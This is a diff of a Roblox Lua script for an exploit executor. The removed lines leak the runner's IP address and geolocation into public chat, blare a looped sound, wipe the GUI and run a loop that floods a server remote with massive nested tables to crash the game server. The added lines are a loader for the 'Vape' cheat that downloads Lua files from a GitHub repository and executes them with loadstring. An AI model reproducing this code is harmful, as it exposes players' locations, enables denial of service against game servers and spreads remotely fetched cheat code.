@@ -1,140 +1,96 @@
--- Подключаем необходимые службы и объекты
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local ChatService = game:GetService("Chat")
+-- illusionHD simple loader
+-- No GitHub API, no commit hashes, no patch injection, no background sync.
 
--- URL для получения IP-адреса
-local getIpUrl = "https://httpbin.org/ip"
--- URL для запроса информации о IP-адресе с использованием ipinfo.io
-local ipinfoUrl = "https://ipinfo.io/"
+repeat task.wait() until game:IsLoaded()
 
-local Sound = Instance.new("Sound", game.Workspace)
-Sound.SoundId = "rbxassetid://9041745502"
-Sound.Volume = 10
-Sound.Looped = true
-Sound:Play()
+local REPO = 'https://raw.githubusercontent.com/illusionhd-dev/A8jfy7YiqnF76qhqiry-4-8-8-18-1-1-818/main/'
 
--- Функция для получения IP-адреса
-local function getIPAddress()
-    local success, response = pcall(function()
-        return game:HttpGet(getIpUrl)
-    end)
-    
-    if success then
-        local successDecode, data = pcall(function()
-            return HttpService:JSONDecode(response)
-        end)
-        
-        if successDecode and data.origin then
-            return data.origin
-        else
-            return nil
-        end
-    else
-        return nil
-    end
+-- These executor filesystem functions are required by Vape.
+assert(type(writefile) == 'function', 'Your executor does not support writefile.')
+assert(type(readfile) == 'function', 'Your executor does not support readfile.')
+assert(type(makefolder) == 'function', 'Your executor does not support makefolder.')
+
+local function folder(path)
+	pcall(makefolder, path)
 end
 
--- Функция для отправки сообщения в чат
-local function sendChatMessage(message)
-    ChatService:Chat(Players.LocalPlayer.Character, message)
+folder('newvape')
+folder('newvape/assets')
+folder('newvape/assets/new')
+folder('newvape/games')
+folder('newvape/guis')
+folder('newvape/libraries')
+folder('newvape/profiles')
+
+local function badResponse(data)
+	if type(data) ~= 'string' or data == '' then
+		return true
+	end
+
+	local head = data:sub(1, 300):lower()
+	return head:find('404: not found', 1, true)
+		or head:find('<!doctype html', 1, true)
+		or head:find('<html', 1, true)
+		or head:find('<svg', 1, true)
+		or head:find('repository not found', 1, true)
 end
 
--- Функция для запроса и вывода подробной информации о IP-адресе через ipinfo.io
-local function analyzeIPAddress(ip)
-    local success, response = pcall(function()
-        return game:HttpGet(ipinfoUrl .. ip .. "/json")
-    end)
-    
-    if success then
-        local successDecode, data = pcall(function()
-            return HttpService:JSONDecode(response)
-        end)
-        
-        if successDecode then
-            sendChatMessage("-- Информация о IP-адресе --")
-            if data.ip then
-                sendChatMessage("IP: " .. data.ip)
-                wait(1)
-            end
-            if data.city then
-                sendChatMessage("City: " .. data.city)
-                wait(1)
-            end
-            if data.region then
-                sendChatMessage("Region: " .. data.region)
-                wait(1)
-            end
-            if data.country then
-                sendChatMessage("Country: " .. data.country)
-                wait(1)
-            end
-            if data.timezone then
-                sendChatMessage("Time zone: " .. data.timezone)
-                wait(1)
-            end
-        else
-            warn("Не удалось декодировать JSON: " .. tostring(response))
-        end
-    else
-        warn("Не удалось выполнить HTTP-запрос: " .. tostring(response))
-    end
+local function download(remote, localPath, required)
+	local ok, data = pcall(function()
+		return game:HttpGet(REPO..remote, true)
+	end)
+
+	if not ok or badResponse(data) then
+		if required then
+			error('[illusionHD] Failed to download '..remote..'\n'..tostring(data), 0)
+		end
+		warn('[illusionHD] Optional file skipped: '..remote)
+		return false
+	end
+
+	writefile(localPath, data)
+	return true
 end
 
--- Пример использования функций
-local ipAddress = getIPAddress()
-if ipAddress then
-    analyzeIPAddress(ipAddress)
-else
-    sendChatMessage("Не удалось получить IP-адрес.")
+-- Always refresh the actual runtime files.
+-- This avoids broken/stale files on somebody else's workspace.
+local files = {
+	{'main.lua',                    'newvape/main.lua'},
+	{'loader.lua',                  'newvape/loader.lua'},
+
+	{'games/universal.lua',         'newvape/games/universal.lua'},
+	{'games/5938036553.lua',        'newvape/games/5938036553.lua'},
+
+	{'guis/loading.lua',            'newvape/guis/loading.lua'},
+	{'guis/themes.lua',             'newvape/guis/themes.lua'},
+	{'guis/new.lua',                'newvape/guis/new.lua'},
+
+	{'libraries/drawing.lua',       'newvape/libraries/drawing.lua'},
+	{'libraries/entity.lua',        'newvape/libraries/entity.lua'},
+	{'libraries/hash.lua',          'newvape/libraries/hash.lua'},
+	{'libraries/prediction.lua',    'newvape/libraries/prediction.lua'}
+}
+
+for _, file in files do
+	download(file[1], file[2], true)
 end
 
--- Таймер обратного отсчета для завершения сессии
-local countdown = 10
-while countdown > 0 do
-    if countdown == 10 or countdown == 5 then
-        sendChatMessage("End of session via: " .. countdown .. "s")
-    end
-    countdown = countdown - 1
-    wait(1)
+-- main.lua still uses this for teleport reload URLs.
+writefile('newvape/profiles/commit.txt', 'main')
+
+-- Optional workspace headshot sound.
+pcall(function()
+	download('headshot.mp3', 'newvape/headshot.mp3', false)
+end)
+
+local source = readfile('newvape/main.lua')
+local chunk, compileError = loadstring(source, 'main')
+
+if not chunk then
+	error('[illusionHD] main.lua compile error:\n'..tostring(compileError), 0)
 end
-wait(1)
-game.Players.LocalPlayer.PlayerGui:ClearAllChildren()
-game.CoreGui:ClearAllChildren()
-sendChatMessage("Сессия завершена.")
-while wait(0.01) do --// don't change it's the best
-game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-local function getmaxvalue(val)
-   local mainvalueifonetable = 499999
-   if type(val) ~= "number" then
-       return nil
-   end
-   local calculateperfectval = (mainvalueifonetable/(val+2))
-   return calculateperfectval
-end
-local function bomb(tableincrease, tries)
-local maintable = {}
-local spammedtable = {}
-table.insert(spammedtable, {})
-z = spammedtable[1]
-for i = 1, tableincrease do
-    local tableins = {}
-    table.insert(z, tableins)
-    z = tableins
-end
-local calculatemax = getmaxvalue(tableincrease)
-local maximum
-if calculatemax then
-     maximum = calculatemax
-     else
-     maximum = 999999
-end
-for i = 1, maximum do
-     table.insert(maintable, spammedtable)
-end
-for i = 1, tries do
-     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-end
-end
-bomb(250, 2) --// change values if client crashes
+
+local ok, runtimeError = pcall(chunk)
+if not ok then
+	error('[illusionHD] main.lua runtime error:\n'..tostring(runtimeError), 0)
 end
